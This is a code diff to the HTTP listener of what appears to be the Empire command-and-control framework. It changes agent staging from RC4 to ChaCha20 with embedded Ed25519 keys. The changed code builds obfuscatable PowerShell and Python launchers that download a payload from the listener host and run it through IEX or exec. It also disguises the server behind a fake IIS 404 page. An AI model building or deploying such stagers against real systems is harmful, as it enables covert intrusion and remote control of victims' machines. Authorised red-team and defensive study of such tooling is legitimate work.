@@ -9,11 +9,14 @@ import time
 from pathlib import Path
 from textwrap import dedent
 
+from cryptography.hazmat.primitives import serialization
+from cryptography.hazmat.primitives.asymmetric import ed25519
 from flask import Flask, make_response, render_template, request, send_from_directory
 from werkzeug.serving import WSGIRequestHandler
 
 from empire.server.common import encryption, helpers, packets, templating
 from empire.server.common.empire import MainMenu
+from empire.server.common.encryption import AESCipher
 from empire.server.core.db import models
 from empire.server.core.db.base import SessionLocal
 from empire.server.utils import data_util, listener_util, log_util
@@ -177,6 +180,21 @@ class Listener:
 
         self.instance_log = log
 
+        self.agent_private_cert_key_object = ed25519.Ed25519PrivateKey.generate()
+        self.server_private_cert_key_object = ed25519.Ed25519PrivateKey.generate()
+        self.agent_private_cert_key = (
+            self.agent_private_cert_key_object.private_bytes_raw()
+        )
+        self.agent_public_cert_key = encryption.publickey_unsafe(
+            self.agent_private_cert_key
+        )
+        self.server_private_cert_key = (
+            self.server_private_cert_key_object.private_bytes_raw()
+        )
+        self.server_public_cert_key = encryption.publickey_unsafe(
+            self.server_private_cert_key
+        )
+
     def default_response(self):
         """
         Returns an IIS 7.5 404 not found page.
@@ -246,7 +264,6 @@ class Listener:
             listenerOptions["Cookie"]["Value"] = cookie
 
         if language == "powershell":
-            # PowerShell
             stager = '$ErrorActionPreference = "SilentlyContinue";'
 
             if safe_checks.lower() == "true":
@@ -315,9 +332,6 @@ class Listener:
             # code to turn the key string into a byte array
             stager += f"$K=[System.Text.Encoding]::ASCII.GetBytes('{staging_key}');"
 
-            # this is the minimized RC4 stager code from rc4.ps1
-            stager += listener_util.powershell_rc4()
-
             # prebuild the request routing packet for the launcher
             routingPacket = packets.build_routing_packet(
                 staging_key,
@@ -342,13 +356,12 @@ class Listener:
                         "$wc.Headers.Add(" + f"'{headerKey}','" + headerValue + "');"
                     )
 
-            # add the RC4 packet to a cookie
+            # add the chacha20 packet to a cookie
             stager += f'$wc.Headers.Add("Cookie","{cookie}={b64RoutingPacket.decode("UTF-8")}");'
             stager += "$data=$wc.DownloadData($ser+$t);"
-            stager += "$iv=$data[0..3];$data=$data[4..$data.length];"
 
             # decode everything and kick it over to IEX to kick off execution
-            stager += "-join[Char[]](& $R $data ($IV+$K))|IEX"
+            stager += "IEX ([Text.Encoding]::UTF8.GetString($data))"
 
             # Remove comments and make one line
             stager = helpers.strip_powershell_comments(stager)
@@ -360,12 +373,11 @@ class Listener:
                     obfuscation_command=obfuscation_command,
                 )
 
-            # base64 encode the stager and return it
             if encode and (
                 (not obfuscate) or ("launcher" not in obfuscation_command.lower())
             ):
                 return helpers.powershell_launcher(stager, launcher)
-            # otherwise return the case-randomized stager
+
             return stager
 
         if language in ["python", "ironpython"]:
@@ -429,7 +441,7 @@ class Listener:
                     if proxy_creds == "default":
                         launcherBase += "o = urllib.request.build_opener(proxy);\n"
 
-                        # add the RC4 packet to a cookie
+                        # add the routing packet to a cookie
                         launcherBase += f'o.addheaders=[(\'User-Agent\',UA), ("Cookie", "{cookie}={b64RoutingPacket}")];\n'
                     else:
                         username = proxy_creds.split(":")[0]
@@ -450,7 +462,7 @@ class Listener:
 
             # install proxy and creds globally, so they can be used with urlopen.
             launcherBase += "urllib.request.install_opener(o);\n"
-            launcherBase += "a=urllib.request.urlopen(req).read();\n"
+            launcherBase += "data=urllib.request.urlopen(req).read();\n"
 
             # download the stager and extract the IV
             launcherBase += listener_util.python_extract_stager(staging_key)
@@ -478,8 +490,25 @@ class Listener:
             jitter = listenerOptions["DefaultJitter"]["Value"]
             lostLimit = listenerOptions["DefaultLostLimit"]["Value"]
 
+            raw_key_bytes = self.agent_private_cert_key_object.private_bytes(
+                encoding=serialization.Encoding.Raw,
+                format=serialization.PrivateFormat.Raw,
+                encryption_algorithm=serialization.NoEncryption(),
+            )
+
+            private_key_array = ",".join(f"0x{b:02x}" for b in raw_key_bytes)
+
+            raw_key_bytes = (
+                self.agent_private_cert_key_object.public_key().public_bytes(
+                    encoding=serialization.Encoding.Raw,
+                    format=serialization.PublicFormat.Raw,
+                )
+            )
+            public_key_array = ",".join(f"0x{b:02x}" for b in raw_key_bytes)
+
             with open(self.mainMenu.installPath + "/stagers/Sharpire.yaml", "rb") as f:
                 stager_yaml = f.read()
+
             stager_yaml = stager_yaml.decode("UTF-8")
             stager_yaml = (
                 stager_yaml.replace("{{ REPLACE_ADDRESS }}", host)
@@ -496,6 +525,8 @@ class Listener:
                         "UTF-8"
                     ),
                 )
+                .replace("{{ agent_private_cert_key }}", private_key_array)
+                .replace("{{ agent_public_cert_key }}", public_key_array)
             )
 
             return str(
@@ -545,7 +576,28 @@ class Listener:
 
             eng = templating.TemplateEngine(template_path)
             template = eng.get_template("http/http.ps1")
+            raw_key_bytes = self.agent_private_cert_key_object.private_bytes(
+                encoding=serialization.Encoding.Raw,
+                format=serialization.PrivateFormat.Raw,
+                encryption_algorithm=serialization.NoEncryption(),
+            )
 
+            private_key_array = ",".join(f"0x{b:02x}" for b in raw_key_bytes)
+
+            raw_key_bytes = (
+                self.agent_private_cert_key_object.public_key().public_bytes(
+                    encoding=serialization.Encoding.Raw,
+                    format=serialization.PublicFormat.Raw,
+                )
+            )
+            public_key_array = ",".join(f"0x{b:02x}" for b in raw_key_bytes)
+            raw_key_bytes = (
+                self.server_private_cert_key_object.public_key().public_bytes(
+                    encoding=serialization.Encoding.Raw,
+                    format=serialization.PublicFormat.Raw,
+                )
+            )
+            server_public_key_array = ",".join(f"0x{b:02x}" for b in raw_key_bytes)
             template_options = {
                 "working_hours": workingHours,
                 "kill_date": killDate,
@@ -555,6 +607,9 @@ class Listener:
                 "host": host,
                 "stage_1": stage1,
                 "stage_2": stage2,
+                "agent_private_cert_key": private_key_array,
+                "server_public_cert_key": server_public_key_array,
+                "agent_public_cert_key": public_key_array,
             }
             stager = template.render(template_options)
 
@@ -575,24 +630,14 @@ class Listener:
                     '$customHeaders = "";', f'$customHeaders = "{headers}";'
                 )
 
-            stagingKey = stagingKey.encode("UTF-8")
-            stager = listener_util.remove_lines_comments(stager)
-
             if obfuscate:
                 stager = self.mainMenu.obfuscationv2.obfuscate(
                     stager, obfuscation_command=obfuscation_command
                 )
 
-            # base64 encode the stager and return it
-            # There doesn't seem to be any conditions in which the encrypt flag isn't set so the other
-            # if/else statements are irrelevant
             if encode:
                 return helpers.enc_powershell(stager)
-            if encrypt:
-                RC4IV = os.urandom(4)
-                return RC4IV + encryption.rc4(
-                    RC4IV + stagingKey, stager.encode("UTF-8")
-                )
+
             return stager
 
         if language.lower() == "python":
@@ -603,11 +648,13 @@ class Listener:
 
             eng = templating.TemplateEngine(template_path)
             template = eng.get_template("http/http.py")
-
             template_options = {
                 "working_hours": workingHours,
                 "kill_date": killDate,
                 "staging_key": stagingKey,
+                "agent_private_cert_key": self.agent_private_cert_key,
+                "server_public_cert_key": self.server_public_cert_key,
+                "agent_public_cert_key": self.agent_public_cert_key,
                 "profile": profile,
                 "session_cookie": self.session_cookie,
                 "host": host,
@@ -619,17 +666,9 @@ class Listener:
             if obfuscate:
                 stager = self.mainMenu.obfuscationv2.python_obfuscate(stager)
 
-            # base64 encode the stager and return it
             if encode:
                 return base64.b64encode(stager)
-            if encrypt:
-                # return an encrypted version of the stager ("normal" staging)
-                RC4IV = os.urandom(4)
 
-                return RC4IV + encryption.rc4(
-                    RC4IV + stagingKey.encode("UTF-8"), stager.encode("UTF-8")
-                )
-            # otherwise return the standard stager
             return stager
 
         log.error(
@@ -745,10 +784,18 @@ class Listener:
 
             eng = templating.TemplateEngine(template_path)
             template = eng.get_template("http/comms.ps1")
+            raw_key_bytes = self.agent_private_cert_key_object.private_bytes(
+                encoding=serialization.Encoding.Raw,
+                format=serialization.PrivateFormat.Raw,
+                encryption_algorithm=serialization.NoEncryption(),
+            )
 
+            powershell_array = ",".join(f"0x{b:02x}" for b in raw_key_bytes)
             template_options = {
                 "session_cookie": self.session_cookie,
                 "host": host,
+                "agent_private_cert_key": powershell_array,
+                "agent_public_cert_key": self.agent_public_cert_key,
             }
 
             return template.render(template_options)
@@ -956,6 +1003,7 @@ class Listener:
             This is used during the first step of the staging process,
             and when the agent requests taskings.
             """
+
             if request_uri.lower() == "welcome.png":
                 # Serves image loaded by index page.
                 #
@@ -999,7 +1047,13 @@ class Listener:
 
             # parse the routing packet and process the results
             dataResults = self.mainMenu.agentcommsv2.handle_agent_data(
-                stagingKey, routingPacket, listenerOptions, clientIP
+                stagingKey,
+                self.agent_public_cert_key,
+                self.server_private_cert_key,
+                self.server_public_cert_key,
+                routingPacket,
+                listenerOptions,
+                clientIP,
             )
 
             if not dataResults or len(dataResults) <= 0:
@@ -1082,6 +1136,7 @@ class Listener:
             """
             Handle an agent POST request.
             """
+
             stagingKey = listenerOptions["StagingKey"]["Value"]
             clientIP = request.remote_addr
             requestData = request.get_data()
@@ -1093,8 +1148,15 @@ class Listener:
             # the routing packet should be at the front of the binary request.data
             #   NOTE: this can also go into a cookie/etc.
             dataResults = self.mainMenu.agentcommsv2.handle_agent_data(
-                stagingKey, requestData, listenerOptions, clientIP
+                stagingKey,
+                self.agent_public_cert_key,
+                self.server_private_cert_key,
+                self.server_public_cert_key,
+                requestData,
+                listenerOptions,
+                clientIP,
             )
+
             if not dataResults or len(dataResults) <= 0:
                 return make_response(self.default_response(), 404)
 
@@ -1165,11 +1227,10 @@ class Listener:
                         else:
                             agentCode = ""
 
-                        if language.lower() in ["python", "ironpython", "go", "csharp"]:
-                            sessionKey = bytes.fromhex(sessionKey)
+                        sessionKey = bytes.fromhex(sessionKey)
 
-                        encryptedAgent = encryption.aes_encrypt_then_hmac(
-                            sessionKey, agentCode
+                        encryptedAgent = AESCipher.encrypt_then_hmac(
+                            sessionKey, agentCode.encode("UTF-8")
                         )
                         return make_response(
                             packets.build_routing_packet(
